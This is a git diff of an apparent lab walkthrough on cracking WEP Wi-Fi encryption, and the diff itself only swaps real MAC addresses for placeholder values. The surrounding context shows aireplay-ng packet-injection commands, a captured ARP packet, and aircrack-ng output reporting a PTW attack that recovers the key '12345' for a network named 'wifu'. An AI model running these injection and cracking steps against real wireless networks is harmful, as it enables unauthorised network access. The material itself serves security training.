@@ -26,14 +26,14 @@ sudo aireplay-ng --interactive -b $BSSID -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 $
 * View output. This is a candidate ARP packet to be used for injection.
 
 ```
-No source MAC (-h) specified. Using the device MAC (00:C0:CA:B2:96:E3)
+No source MAC (-h) specified. Using the device MAC (AB:CD:EF:12:34:56)
 Read 171 packets...
 
         Size: 86, FromDS: 1, ToDS: 0 (WEP)
 
-              BSSID  =  00:9F:A9:24:B9:28
+              BSSID  =  AA:BB:CC:DD:EE:FF
           Dest. MAC  =  FF:FF:FF:FF:FF:FF
-         Source MAC  =  10:9F:A9:24:B9:25
+         Source MAC  =  11:22:33:44:55:FF
 
         0x0000:  0842 0000 ffff ffff ffff 009f a924 b928  .B...........$.(
         0x0010:  109f a924 b925 e0fc b18f 0500 0991 2b11  ...$.%........+.
@@ -63,7 +63,7 @@ Read 806868 packets.
 
    #  BSSID              ESSID                     Encryption
 
-   1  00:9F:A9:24:B9:28  wifu                      WGot 184612 out of 180000 IVsStarting PTW attack with 184612 ivs.
+   1  AA:BB:CC:DD:EE:FF  wifu                      WGot 184612 out of 180000 IVsStarting PTW attack with 184612 ivs.
                      KEY FOUND! [ 31:32:33:34:35 ] (ASCII: 12345 )
 ChoosingDecrypted correctly: 100%
 ```
@@ -82,4 +82,3 @@ sudo aireplay-ng --interactive -r replay_src-0613-135427.cap $INTERFACE
 * [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
 * [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
 * [Interactive Packet Replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay)
-
